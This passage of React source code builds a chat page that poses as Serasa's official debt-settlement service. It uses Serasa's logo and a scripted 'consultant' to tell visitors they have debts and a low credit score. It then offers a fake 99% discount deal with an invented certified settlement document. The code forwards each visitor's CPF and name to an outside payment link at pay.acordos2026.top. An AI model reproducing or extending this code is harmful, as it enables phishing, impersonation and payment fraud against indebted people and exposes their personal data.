  const playAudioFeirao = () => {
    hasTriggeredFeiraoRef.current = false

    const audioMsg: Message = {
      id: "audio-3-fernanda",
      type: "audio",
      content: "",
      sender: "bot",
      timestamp: new Date(),
      audioUrl: "/audio-3.mp3",
    }
    addMessageWithTyping(audioMsg, 1800)
  }

  const triggerFeiraoQuestion = useCallback(() => {
    if (hasTriggeredFeiraoRef.current) return
    hasTriggeredFeiraoRef.current = true

    const city = userData?.cidade || "Iracema"
    const feiraoQuestion: Message = {
      id: "feirao-question-ofertas",
      type: "text",
      content: `Último dia do Feirão limpa nome em <b>${city}</b>.\n\nDeseja consultar as ofertas disponíveis para o seu CPF?`,
      sender: "bot",
      timestamp: new Date(),
      buttons: [
        {
          text: "Quero Consultar",
          action: "quero-consultar",
        },
      ],
    }
    const t = setTimeout(() => {
      addMessageWithTyping(feiraoQuestion, 3000)
    }, 1600)
    activeTimeoutsRef.current.push(t)
  }, [userData])

  /* STEP 4: Análise CPF + Score animado (291) */
  const startDebtAnalysisFromScreenshots = () => {
    const msg1: Message = {
      id: "step4-aguarde",
      type: "text",
      content: `<i><b>Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..</b></i>`,
      sender: "bot",
      timestamp: new Date(),
    }
    addMessageWithTyping(msg1, 2800)

    const t1 = setTimeout(() => {
      const msg2: Message = {
        id: "step4-consultando",
        type: "text",
        content: `<i><b>Consultando..</b></i>`,
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(msg2, 2400)

      const t2 = setTimeout(() => {
        const bannerFeirao: Message = {
          id: "step4-banner-analise",
          type: "image",
          content: "",
          sender: "bot",
          timestamp: new Date(),
          imageUrl: "/analise-feirao.webp",
        }
        addMessageWithTyping(bannerFeirao, 2000)

        const t3 = setTimeout(() => {
          const analiseConcluida: Message = {
            id: "step4-concluida",
            type: "text",
            content: `<i><b>Análise concluída!</b></i>`,
            sender: "bot",
            timestamp: new Date(),
          }
          addMessageWithTyping(analiseConcluida, 2400)

          const t4 = setTimeout(() => {
            const dividasMsg: Message = {
              id: "step4-dividas",
              type: "text",
              content: `Identificamos <b>4 dívidas ativas</b> no sistema.\nOs valores variam entre <b>R$ 1.728,74 a R$ 5.278,23</b> de dívida <b>em seu CPF.</b>`,
              sender: "bot",
              timestamp: new Date(),
            }
            addMessageWithTyping(dividasMsg, 3600)

            const t5 = setTimeout(() => {
              const negativadoMsg: Message = {
                id: "step4-negativado",
                type: "text",
                content: `<i>Situação para CPF:</i>\n\n<b>NEGATIVADO.</b>`,
                sender: "bot",
                timestamp: new Date(),
              }
              addMessageWithTyping(negativadoMsg, 2800)

              const t6 = setTimeout(() => {
                const scoreIntroMsg: Message = {
                  id: "step4-score-intro",
                  type: "text",
                  content: `Segundo nossos registros, seu SCORE é considerado muito baixo <b>(alto risco para crédito):</b>`,
                  sender: "bot",
                  timestamp: new Date(),
                }
                addMessageWithTyping(scoreIntroMsg, 3200)

                const t7 = setTimeout(() => {
                  const scoreGaugeMsg: Message = {
                    id: "step4-score-gauge",
                    type: "score-gauge",
                    content: "",
                    sender: "bot",
                    timestamp: new Date(),
                    data: {
                      targetScore: 291,
                    },
                  }
                  addMessageWithTyping(scoreGaugeMsg, 2200)

                  const t8 = setTimeout(() => {
                    const perguntaAcordoMsg: Message = {
                      id: "step4-pergunta-acordo",
                      type: "text",
                      content: `Você deseja verificar se existe algum acordo com desconto disponível para você?`,
                      sender: "bot",
                      timestamp: new Date(),
                      buttons: [
                        {
                          text: "Buscar Acordo",
                          action: "sim-desejo",
                        },
                      ],
                    }
                    addMessageWithTyping(perguntaAcordoMsg, 2800)
                  }, 5500)
                  activeTimeoutsRef.current.push(t8)
                }, 3800)
                activeTimeoutsRef.current.push(t7)
              }, 4200)
              activeTimeoutsRef.current.push(t6)
            }, 4400)
            activeTimeoutsRef.current.push(t5)
          }, 3800)
          activeTimeoutsRef.current.push(t4)
        }, 4000)
        activeTimeoutsRef.current.push(t3)
      }, 3600)
      activeTimeoutsRef.current.push(t2)
    }, 3800)
    activeTimeoutsRef.current.push(t1)
  }

  /* STEP 5: Buscar Acordo */
  const stepBuscarAcordo = () => {
    const rawCpf = userData?.cpf ? userData.cpf.replace(/\D/g, "") : ""
    const nome = userData?.nome || "Cliente"

    const aguardeMsg: Message = {
      id: "s5-aguarde-acordo",
      type: "text",
      content: `Aguarde um instante enquanto verifico aqui no sistema se existem acordos disponíveis para você...`,
      sender: "bot",
      timestamp: new Date(),
    }
    addMessageWithTyping(aguardeMsg, 3000)

    const t1 = setTimeout(() => {
      const capturar2Img: Message = {
        id: "s5-capturar2-img",
        type: "image",
        content: "",
        sender: "bot",
        timestamp: new Date(),
        imageUrl: "/Capturar2.png",
      }
      addMessageWithTyping(capturar2Img, 2200)

      const t2 = setTimeout(() => {
        const acordoEncontradoMsg: Message = {
          id: "s5-acordo-encontrado",
          type: "text",
          content: `<b>Acordo encontrado!</b>\n\n1 (um) acordo foi encontrado para:\n\n<b>${nome}</b> (CPF ${rawCpf})`,
          sender: "bot",
          timestamp: new Date(),
          buttons: [
            {
              text: "VER ACORDO",
              action: "ver-acordo",
            },
          ],
        }
        addMessageWithTyping(acordoEncontradoMsg, 3000)
      }, 4200)
      activeTimeoutsRef.current.push(t2)
    }, 4400)
    activeTimeoutsRef.current.push(t1)
  }

  /* STEP 6: VER ACORDO (Áudio 2: audio-4.mp3 com duração de 43.18s)
     Garantir que as mensagens seguintes tenham delays humanizados e acompanhem a fala da Fernanda,
     e a pergunta/botão final só apareça DEPOIS que o áudio 2 já terminou de rodar por completo!
  */
  const stepVerAcordo = () => {
    const nome = userData?.nome || "Cliente"
    const firstName = nome.split(" ")[0]
    const formattedCpf = formatCPF(userData?.cpf || "")
    const today = new Date().toLocaleDateString("pt-BR")

    // Envia o segundo áudio (audio-4.mp3 - 43.18s)
    const audio4Msg: Message = {
      id: "audio-4-fernanda",
      type: "audio",
      content: "",
      sender: "bot",
      timestamp: new Date(),
      audioUrl: "/audio-4.mp3",
    }
    addMessageWithTyping(audio4Msg, 1600)

    // Mensagem 1: Parabéns (entra aos ~11s de áudio, digitando a partir de 8.5s)
    const t1 = setTimeout(() => {
      const parabensMsg: Message = {
        id: "s6-parabens-super-acordo",
        type: "text",
        content: `Parabéns <b>${firstName}!</b>\n\nPode comemorar! Encontramos um <b>SUPER ACORDO DE 99% DE DESCONTO</b> para você!`,
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(parabensMsg, 3000)

      // Mensagem 2: Acessando acordo (entra aos ~21s de áudio, digitando a partir de 18s)
      const t2 = setTimeout(() => {
        const acessandoMsg: Message = {
          id: "s6-acessando-acordo",
          type: "text",
          content: `<i>Acessando o acordo</i> <b style="color:#e6007e">83N2L618362E...</b>`,
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(acessandoMsg, 2800)

        // Mensagem 3: Termo e Documento do Acordo (entra aos ~28s de áudio)
        const t3 = setTimeout(() => {
          const termoDocumento: Message = {
            id: "s6-termo-documento",
            type: "agreement-document",
            content: "",
            sender: "bot",
            timestamp: new Date(),
            data: {
              acordoId: "83N2L618362E",
              nome: userData?.nome,
              cpf: userData?.cpf,
              valorDivida: "7.566,52",
              valorContrato: "78,47",
              desconto: "99,0",
              valorDesconto: "7.488,05",
              vencimento: today,
            },
          }
          addMessageWithTyping(termoDocumento, 2200)

          // Mensagem 4: Informações do acordo (entra aos ~37s de áudio)
          const t4 = setTimeout(() => {
            const infoAcordoMsg: Message = {
              id: "s6-info-acordo",
              type: "text",
              content: `Informações do acordo <b style="color:#e6007e">83N2L618362E</b> para:\n\n<b>Nome:</b> ${nome}\n\n<b>CPF:</b> ${formattedCpf}`,
              sender: "bot",
              timestamp: new Date(),
            }
            addMessageWithTyping(infoAcordoMsg, 3000)

            // Mensagem 5: Aviso de Titular (entra aos ~44s, quando o áudio 2 de 43.18s termina)
            const t5 = setTimeout(() => {
              const titularMsg: Message = {
                id: "s6-titular-aviso",
                type: "text",
                content: `O contrato atual é válido apenas para o titular: <b>${nome}</b> portador(a) do CPF: <b>${formattedCpf}</b>`,
                sender: "bot",
                timestamp: new Date(),
              }
              addMessageWithTyping(titularMsg, 2800)

              // Mensagem 6 + Botão: Pergunta final (entra aos ~51s, áudio 2 totalmente finalizado)
              const t6 = setTimeout(() => {
                const perguntaFinalMsg: Message = {
                  id: "s6-pergunta-final",
                  type: "text",
                  content: `Você gostaria de realizar o seu acordo com <b>99% DE DESCONTO</b> para quitar todas as suas dívidas e ter seu nome limpo novamente por apenas <b>R$ 78,47</b>?`,
                  sender: "bot",
                  timestamp: new Date(),
                  buttons: [
                    {
                      text: "Confirmar acordo e limpar o nome",
                      action: "confirmar-acordo",
                    },
                  ],
                }
                addMessageWithTyping(perguntaFinalMsg, 3200)
              }, 6000)
              activeTimeoutsRef.current.push(t6)
            }, 6500)
            activeTimeoutsRef.current.push(t5)
          }, 6500)
          activeTimeoutsRef.current.push(t4)
        }, 6500)
        activeTimeoutsRef.current.push(t3)
      }, 7000)
      activeTimeoutsRef.current.push(t2)
    }, 8500)
    activeTimeoutsRef.current.push(t1)
  }

  /* STEP 7: Confirmar acordo e limpar o nome (Áudio 3: audio-5.mp3 - 16.77s) */
  const stepConfirmarAcordo = () => {
    // Pausa qualquer áudio anterior imediatamente para evitar qualquer sobreposição
    if (typeof document !== "undefined") {
      document.querySelectorAll("audio").forEach((el) => {
        try {
          el.pause()
        } catch {}
      })
    }

    const audio5Msg: Message = {
      id: "audio-5-fernanda",
      type: "audio",
      content: "",
      sender: "bot",
      timestamp: new Date(),
      audioUrl: "/audio-5.mp3",
    }
    addMessageWithTyping(audio5Msg, 1600)

    // Aguarda o término do áudio 3 (~17s) para enviar a pergunta seguinte
    const t = setTimeout(() => {
      const desejaMsg: Message = {
        id: "s7-deseja-realizar",
        type: "text",
        content: `Deseja realizar o acordo e ter seu nome limpo ainda hoje?`,
        sender: "bot",
        timestamp: new Date(),
        buttons: [
          {
            text: "Continuar com pagamento",
            action: "continuar-pagamento",
          },
        ],
      }
      addMessageWithTyping(desejaMsg, 2800)
    }, 17500)
    activeTimeoutsRef.current.push(t)
  }

  /* STEP 8: Continuar com pagamento (Áudio 4: audio-6.mp3 - 29.10s) */
  const stepContinuarPagamento = () => {
    // Pausa qualquer áudio anterior
    if (typeof document !== "undefined") {
      document.querySelectorAll("audio").forEach((el) => {
        try {
          el.pause()
        } catch {}
      })
    }

    const rawCpf = userData?.cpf ? userData.cpf.replace(/\D/g, "") : ""
    const nome = userData?.nome || "Cliente"

    const audio6Msg: Message = {
      id: "audio-6-fernanda",
      type: "audio",
      content: "",
      sender: "bot",
      timestamp: new Date(),
      audioUrl: "/audio-6.mp3",
    }
    addMessageWithTyping(audio6Msg, 1600)

    // Mensagem aos 8s de áudio
    const t1 = setTimeout(() => {
      const confirmandoMsg: Message = {
        id: "s8-confirmando",
        type: "text",
        content: `<i>Confirmando o acordo...</i>`,
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(confirmandoMsg, 2600)

      // Mensagem aos 17s de áudio
      const t2 = setTimeout(() => {
        const serasaInformaMsg: Message = {
          id: "s8-serasa-informa",
          type: "text",
          content: `<b>SERASA INFORMA:</b>\nAo efetuar o pagamento do acordo, todas as dívidas em aberto no CPF <b>${rawCpf}</b> serão removidas em 1 hora, e você terá o seu nome limpo novamente!`,
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(serasaInformaMsg, 3200)

        // Mensagem aos 25s de áudio
        const t3 = setTimeout(() => {
          const parabensConfirmadoMsg: Message = {
            id: "s8-parabens-confirmado",
            type: "text",
            content: `<b>Parabéns!</b>\nSeu acordo foi confirmado.`,
            sender: "bot",
            timestamp: new Date(),
          }
          addMessageWithTyping(parabensConfirmadoMsg, 2600)

          // Comprovante embed aos 31s (após o término do áudio 6 de 29s)
          const t4 = setTimeout(() => {
            const paymentProofEmbed: Message = {
              id: "s8-payment-proof-embed",
              type: "embed",
              content: "",
              sender: "bot",
              timestamp: new Date(),
              embedUrl: `https://cerulean-bavarois-8fa9a8.netlify.app/proof-2/?name=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(rawCpf)}&value=78,47`,
            }
            addMessageWithTyping(paymentProofEmbed, 2400)

            // Guia gerada
            const t5 = setTimeout(() => {
              const paymentGenerated: Message = {
                id: "s8-payment-generated",
                type: "payment-guide",
                content: `A guia de pagamento foi gerada para o acordo 83N2L618362E!`,
                sender: "bot",
                timestamp: new Date(),
                data: {
                  acordoId: "83N2L618362E",
                  nome: nome,
                  cpf: rawCpf,
                  valor: "78,47",
                },
              }
              addMessageWithTyping(paymentGenerated, 2600)

              // Botão final para checkout
              const t6 = setTimeout(() => {
                const paymentButton: Message = {
                  id: "s8-btn-pagamento",
                  type: "text",
                  content: `Clique no botão abaixo para acessar a página de pagamento seguro e liberar seu comprovante:`,
                  sender: "bot",
                  timestamp: new Date(),
                  buttons: [
                    {
                      text: "IR PARA PAGINA DE PAGAMENTO",
                      action: "acessar-pagamento",
                    },
                  ],
                }
                addMessageWithTyping(paymentButton, 2800)
              }, 4500)
              activeTimeoutsRef.current.push(t6)
            }, 5000)
            activeTimeoutsRef.current.push(t5)
          }, 5500)
          activeTimeoutsRef.current.push(t4)
        }, 5500)
        activeTimeoutsRef.current.push(t3)
      }, 7000)
      activeTimeoutsRef.current.push(t2)
    }, 8000)
    activeTimeoutsRef.current.push(t1)
  }

  const redirectToPayment = () => {
    try {
      const checkoutUrl = new URL("https://pay.acordos2026.top/ODAK3LXnLeo3E6V")

      if (typeof window !== "undefined") {
        const currentParams = new URLSearchParams(window.location.search)
        currentParams.forEach((v, k) => {
          if (v) checkoutUrl.searchParams.set(k, v)
        })
      }

      if (userData?.cpf) {
        const rawCpf = userData.cpf.replace(/\D/g, "")
        checkoutUrl.searchParams.set("cpf", rawCpf)
      }
      if (userData?.nome) {
        checkoutUrl.searchParams.set("nome", userData.nome)
        checkoutUrl.searchParams.set("name", userData.nome)
      }

      window.location.href = checkoutUrl.toString()
    } catch {
      window.location.href = "https://pay.acordos2026.top/ODAK3LXnLeo3E6V"
    }
  }

  if (!cpf) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-pink-50 to-pink-100 flex items-center justify-center p-4">
        <Card className="p-8 text-center bg-white shadow-xl border-0 max-w-sm w-full">
          <div className="w-16 h-16 bg-pink-100 rounded-full flex items-center justify-center mx-auto mb-4 overflow-hidden border-2 border-pink-200">
            <Image
              src="/fernanda-avatar.jpg"
              alt="Fernanda Serasa"
              width={64}
              height={64}
              className="w-full h-full object-cover"
            />
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">CPF não informado</h1>
          <p className="text-sm text-gray-600">Por favor, volte à página inicial e insira seu CPF para consultar suas dívidas.</p>
        </Card>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 h-[100dvh] flex flex-col bg-gradient-to-br from-pink-50 to-white overflow-hidden">
      {/* Header Premium com Identidade Oficial Serasa + Dados do Cliente com Asteriscos */}
      <header className="flex-shrink-0 z-50 bg-[#e6007e] text-white shadow-md select-none border-b border-pink-700/30">
        {/* Linha Superior: Logo, Consultora Online e Avatar */}
        <div className="max-w-4xl mx-auto px-4 pt-[max(0.6rem,env(safe-area-inset-top))] pb-2 flex items-center justify-between gap-3">
          <div className="flex items-center gap-2.5 min-w-0">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
              alt="Serasa"
              width={105}
              height={34}
              className="h-6 sm:h-7 w-auto object-contain flex-shrink-0"
              priority
            />
            <div className="h-5 w-[1px] bg-white/25 hidden xs:block"></div>
            <div className="min-w-0">
              <div className="flex items-center gap-1.5">
                <span className={`w-2 h-2 rounded-full flex-shrink-0 ${isFernandaJoined ? "bg-emerald-400 animate-pulse" : "bg-pink-300"}`}></span>
                <span className="font-bold text-xs sm:text-sm truncate leading-tight">
                  {isFernandaJoined ? "Fernanda - Consultora" : "Atendimento Serasa"}
                </span>
              </div>
              <span className="text-[10px] text-pink-100/90 block leading-tight truncate">
                {isFernandaJoined ? "Atendimento Oficial Serasa" : "Canal Oficial de Atendimento"}
              </span>
            </div>
          </div>

          <div className="flex items-center gap-2 flex-shrink-0">
            <div className="text-right hidden sm:block">
              <p className="text-[11px] opacity-80">Feirão Limpa Nome</p>
              <p className="text-xs font-bold text-amber-200">Último dia!</p>
            </div>
            <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full bg-white/20 p-0.5 border border-white/50 overflow-hidden shadow-xs">
              <Image
                src={isFernandaJoined ? "/fernanda-avatar.jpg" : "/serasa-avatar.png"}
                alt="Atendente"
                width={40}
                height={40}
                className="w-full h-full rounded-full object-cover"
                priority
              />
            </div>
          </div>
        </div>

        {/* Faixa Inferior de Identificação do Cliente: Nome + CPF Mascarado com Asteriscos */}
        {userData && (
          <div className="bg-[#b80065] px-4 py-1.5 text-white text-[11px] border-t border-pink-400/25 shadow-inner">
            <div className="max-w-4xl mx-auto flex items-center justify-between gap-2">
              <div className="flex items-center gap-1.5 min-w-0 truncate">
                <User className="w-3.5 h-3.5 text-pink-200 flex-shrink-0" />
                <span className="font-semibold text-white truncate text-[11px]">
                  {userData.nome}
                </span>
              </div>
              <div className="flex items-center gap-1 flex-shrink-0 bg-black/25 px-2 py-0.5 rounded border border-white/10 font-mono">
                <span className="text-[9.5px] uppercase text-pink-200 font-sans tracking-wider">CPF:</span>
                <span className="font-bold tracking-wider text-[11px] text-white">
                  {maskCPF(userData.cpf)}
                </span>
              </div>
            </div>
          </div>
        )}
      </header>

      {/* Área Rolável de Mensagens */}
      <main
        ref={chatContainerRef}
        className="flex-1 overflow-y-auto overflow-x-hidden relative overscroll-y-contain"
        style={{
          WebkitOverflowScrolling: "touch",
          scrollBehavior: "smooth",
        }}
      >
        <div className="max-w-4xl mx-auto bg-white/80 backdrop-blur-sm min-h-full relative shadow-xl">
          <div className="p-3.5 sm:p-4 space-y-4 pb-[max(5rem,calc(env(safe-area-inset-bottom)+4rem))]">
            {isLoading && (
              <div className="flex justify-center py-8">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
              </div>
            )}

            {messages.map((message, index) => (
              <div key={`${message.id}-${index}`}>
                {message.type === "system" ? (
                  <div className="flex justify-center my-2">
                    <span className="text-[11px] font-medium text-pink-700 bg-pink-100/90 border border-pink-200 px-3 py-1 rounded-full shadow-xs">
                      {message.content}
                    </span>
                  </div>
                ) : (
                  <div className={`flex ${message.sender === "bot" ? "justify-start" : "justify-end"}`}>
                    <div className={message.sender === "bot" ? "w-full max-w-[340px] sm:max-w-[380px] lg:max-w-md" : "max-w-[85%] sm:max-w-md"}>
                      <div
                        className={`flex items-start gap-2 mb-2 ${message.sender === "bot" ? "flex-row" : "flex-row-reverse"}`}
                      >
                        <div
                          className={`w-8 h-8 ${message.sender === "bot" ? "bg-pink-600" : "bg-blue-500"} rounded-full flex items-center justify-center text-white text-sm font-semibold flex-shrink-0 overflow-hidden shadow-xs border border-pink-200`}
                        >
                          {message.sender === "bot" ? (
                            <Image
                              src={message.avatar || (isFernandaJoined ? "/fernanda-avatar.jpg" : "/serasa-avatar.png")}
                              alt={isFernandaJoined ? "Fernanda Atendente" : "Serasa Oficial"}
                              width={32}
                              height={32}
                              className="w-full h-full rounded-full object-cover"
                            />
                          ) : (
                            userData?.nome?.charAt(0).toUpperCase() || "U"
                          )}
                        </div>
                        <div className={message.sender === "bot" ? "flex-1 min-w-0 flex flex-col items-start" : "flex flex-col items-end"}>
                          <div
                            className={`${
                              message.type === "agreement-document" || message.type === "score-gauge" || message.type === "payment-guide"
                                ? "bg-transparent border-0 p-0 shadow-none w-full"
                                : message.type === "data-confirmation"
                                ? "w-full"
                                : message.sender === "bot"
                                ? "w-fit max-w-full bg-gray-100 border-gray-200 shadow-sm rounded-2xl rounded-tl-xs px-4 py-2.5 border text-gray-800"
                                : "w-fit bg-pink-600 text-white shadow-sm rounded-2xl rounded-tr-xs px-4 py-2.5 border-0 font-medium"
                            }`}
                          >
                            {message.type === "local-video" && message.videoUrl && (
                              <InlineVideoPlayer
                                videoUrl={message.videoUrl}
                                onFinished={triggerDataVerificationFlow}
                              />
                            )}

                            {message.type === "image" && message.imageUrl && (
                              <div className="mb-2">
                                <Image
                                  src={message.imageUrl}
                                  alt=""
                                  width={340}
                                  height={220}
                                  className="rounded-lg w-full h-auto object-contain"
                                  onLoad={() => scrollToBottom("smooth")}
                                />
                              </div>
                            )}

                            {message.type === "score-gauge" && (
                              <div className="my-1">
                                <AnimatedScoreGauge targetScore={message.data?.targetScore || 291} />
                              </div>
                            )}

                            {message.type === "audio" && message.audioUrl && (
                              <div className="mb-1">
                                <ModernAudioPlayer
                                  audioUrl={message.audioUrl}
                                  messageId={message.id}
                                  onFinished={message.id === "audio-3-fernanda" ? triggerFeiraoQuestion : undefined}
                                />
                              </div>
                            )}

                            {message.type === "embed" && message.embedUrl && (
                              <div className="mb-2 w-full max-w-[340px] sm:max-w-[380px]">
                                <iframe
                                  src={message.embedUrl}
                                  width="300"
                                  height="400"
                                  frameBorder="0"
                                  className="rounded-xl w-full border border-slate-200 shadow-md bg-white"
                                  title="Carta de Quitação"
                                ></iframe>
                              </div>
                            )}

                            {message.type === "agreement-document" && message.data ? (
                              <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 select-none font-sans">
                                <div className="bg-white border border-slate-300 rounded-xl shadow-md overflow-hidden text-xs text-slate-800">
                                  <div className="h-1 bg-[#e6007e]"></div>

                                  <div className="px-3.5 py-2.5 bg-slate-50 border-b border-slate-200">
                                    <div className="flex items-center justify-between">
                                      <div className="flex items-center">
                                        <Image
                                          src="/serasa-limpa-nome-color.svg"
                                          alt="Serasa Limpa Nome"
                                          width={125}
                                          height={30}
                                          className="h-5 w-auto object-contain"
                                        />
                                      </div>
                                      <span className="text-[9px] font-semibold text-slate-600 bg-slate-200/80 px-2 py-0.5 rounded">
                                        VIA DO TITULAR
                                      </span>
                                    </div>
                                    <div className="mt-1.5 flex items-center justify-between text-[11px] pt-1.5 border-t border-slate-200/60">
                                      <span className="font-bold text-slate-900 uppercase text-[10px]">
                                        Termo de Quitação Extrajudicial
                                      </span>
                                      <span className="text-[10px] font-mono font-bold text-slate-600">
                                        Nº {message.data.acordoId || "83N2L618362E"}
                                      </span>
                                    </div>
                                  </div>

                                  <div className="px-3.5 py-2 bg-white border-b border-slate-100 flex items-center justify-between">
                                    <div className="min-w-0 pr-2">
                                      <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
                                        Titular Beneficiário(a)
                                      </span>
                                      <span className="font-bold text-slate-900 text-xs block truncate max-w-[190px]">
                                        {message.data.nome || "Cliente"}
                                      </span>
                                    </div>
                                    <div className="text-right flex-shrink-0">
                                      <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
                                        CPF
                                      </span>
                                      <span className="font-mono text-xs text-slate-700 font-semibold">
                                        {formatCPF(message.data.cpf)}
                                      </span>
                                    </div>
                                  </div>

                                  <div className="px-3.5 py-2.5 bg-slate-50/50 space-y-1.5 text-xs">
                                    <div className="flex justify-between items-center text-slate-600">
                                      <span>Dívida Total Original:</span>
                                      <span className="line-through text-slate-400 font-mono font-medium">
                                        R$ {message.data.valorDivida || "7.566,52"}
                                      </span>
                                    </div>
                                    <div className="flex justify-between items-center text-slate-600">
                                      <span className="text-emerald-700 font-medium">Desconto Feirão (99%):</span>
                                      <span className="font-bold text-emerald-700 font-mono">
                                        - R$ {message.data.valorDesconto || "7.488,05"}
                                      </span>
                                    </div>
                                    <div className="flex justify-between items-center text-slate-600">
                                      <span>Juros e Encargos:</span>
                                      <span className="font-semibold text-slate-700">100% Isentos</span>
                                    </div>

                                    <div className="bg-[#f0fdf4] border border-[#86efac] rounded-lg p-2.5 my-1.5">
                                      <div className="flex justify-between items-center">
                                        <div>
                                          <span className="text-[9px] text-emerald-800 font-bold uppercase block tracking-wider">
                                            Total a Pagar (Único)
                                          </span>
                                          <span className="text-xl font-black text-[#15803d] font-mono leading-tight">
                                            R$ {message.data.valorContrato || "78,47"}
                                          </span>
                                        </div>
                                        <div className="text-right">
                                          <span className="bg-emerald-100 text-emerald-800 px-1.5 py-0.5 rounded text-[9px] font-bold inline-block mb-0.5">
                                            PIX À VISTA
                                          </span>
                                          <span className="text-[10px] text-slate-600 block font-mono">
                                            Venc: {message.data.vencimento || new Date().toLocaleDateString("pt-BR")}
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </div>

                                  <div className="px-3 py-2 bg-amber-50/80 border-t border-b border-amber-200 text-[10px] text-amber-900 leading-snug">
                                    <strong>Aviso:</strong> Válido exclusivamente para o titular. A quitação via PIX gera baixa automática e cancelamento das pendências na Serasa e SPC em até 1 hora útil.
                                  </div>

                                  <div className="px-3 py-2 bg-white flex flex-col items-center">
                                    <div className="h-5 w-full max-w-[220px] flex items-stretch justify-between px-1 opacity-70">
                                      {[3,1,2,1,4,1,2,3,1,2,4,1,2,1,3,2,1,4,1,2,3,1,2,4,1,2].map((w, idx) => (
                                        <div key={idx} className="bg-slate-900" style={{ width: `${w}px` }} />
                                      ))}
                                    </div>
                                    <div className="text-[8.5px] font-mono text-slate-700 mt-1 font-semibold">
                                      83N20.61836 2E987.050012 34000.784700 1 98760000007847
                                    </div>
                                    <div className="text-[7.5px] uppercase tracking-wider text-slate-400 mt-0.5">
                                      Certificação Digital Serasa Experian • ICP-Brasil
                                    </div>
                                  </div>
                                </div>
                              </div>
                            ) : message.type === "payment-guide" ? (
                              <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
                                <div className="bg-white rounded-2xl border border-pink-100 shadow-md p-4 text-xs overflow-hidden">
                                  <div className="h-1 bg-[#e6007e] -mx-4 -mt-4 mb-3"></div>
                                  <div className="flex items-center gap-2.5 pb-2.5 border-b border-slate-100">
                                    <div className="w-9 h-9 rounded-xl bg-pink-50 border border-pink-200 flex items-center justify-center text-[#e6007e] flex-shrink-0">
                                      <QrCode className="w-5 h-5" />
                                    </div>
                                    <div>
                                      <h4 className="font-bold text-slate-900 text-sm">A guia de pagamento foi gerada!</h4>
                                      <p className="text-[11px] text-slate-500 font-mono">Acordo nº {message.data?.acordoId || "83N2L618362E"}</p>
                                    </div>
                                  </div>

                                  <div className="py-2.5 space-y-2 text-slate-600">
                                    <div className="flex justify-between items-center text-xs">
                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Beneficiário(a):</span>
                                      <span className="font-bold text-slate-800 text-right truncate max-w-[180px]">{message.data?.nome || userData?.nome || "Cliente"}</span>
                                    </div>
                                    <div className="flex justify-between items-center text-xs">
                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Identificação (CPF):</span>
                                      <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data?.cpf || userData?.cpf || "")}</span>
                                    </div>
                                    <div className="flex justify-between items-center text-xs">
                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Modalidade:</span>
                                      <span className="font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200 text-[11px]">PIX Baixa Imediata</span>
                                    </div>
                                    <div className="flex justify-between items-center text-xs">
                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Status:</span>
                                      <span className="font-semibold text-amber-700 bg-amber-50 px-2 py-0.5 rounded border border-amber-200 text-[11px] flex items-center gap-1">
                                        <Clock className="w-3 h-3" /> Aguardando Liquidação
                                      </span>
                                    </div>
                                  </div>

                                  <div className="pt-2 border-t border-slate-100 text-[11px] text-slate-500 leading-tight">
                                    Clique no botão abaixo para ir à página de pagamento seguro e liberar seu comprovante de quitação.
                                  </div>
                                </div>
                              </div>
                            ) : message.type === "data-confirmation" ? (
                              <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
                                <p className="text-sm font-semibold text-gray-800 mb-2.5">
                                  {message.content}
                                </p>
                                {message.data && (
                                  <div className="bg-white rounded-2xl border border-slate-200 shadow-md p-4 text-xs">
                                    <div className="flex items-center justify-between pb-2.5 mb-2.5 border-b border-slate-100">
                                      <div className="flex items-center gap-2">
                                        <ShieldCheck className="w-4 h-4 text-pink-600" />
                                        <span className="font-bold text-slate-800 text-xs">Dados Cadastrais Confirmados</span>
                                      </div>
                                      <span className="text-[10px] bg-emerald-50 text-emerald-600 font-semibold px-2 py-0.5 rounded-full border border-emerald-200">
                                        Validação RFB
                                      </span>
                                    </div>

                                    <div className="space-y-2.5">
                                      <div>
                                        <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome Completo</span>
                                        <span className="font-bold text-slate-900 text-sm leading-snug">{message.data.nome || "Cliente"}</span>
                                      </div>

                                      <div className="grid grid-cols-2 gap-2">
                                        <div>
                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Identificação (CPF)</span>
                                          <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data.cpf || "")}</span>
                                        </div>
                                        <div>
                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nascimento</span>
                                          <span className="font-semibold text-slate-800">{message.data.nascimento || "01/08/1974"}</span>
                                        </div>
                                      </div>

                                      <div>
                                        <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome da Mãe</span>
                                        <span className="font-medium text-slate-700">{message.data.mae || "ANTONIA MAGALHAES FERREIRA"}</span>
                                      </div>

                                      <div className="grid grid-cols-2 gap-2">
                                        <div>
                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Sexo</span>
